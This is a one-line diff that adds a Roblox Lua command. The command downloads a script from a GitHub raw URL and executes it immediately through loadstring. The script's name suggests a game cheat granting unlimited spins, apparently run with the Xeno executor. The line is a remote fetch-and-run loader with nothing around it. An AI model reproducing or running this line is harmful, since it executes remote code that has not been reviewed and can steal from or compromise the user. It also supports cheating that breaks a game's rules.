@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vep1032/VepStuff/main/INF%20SPINS%20XENO%20ONLINE%202"))()
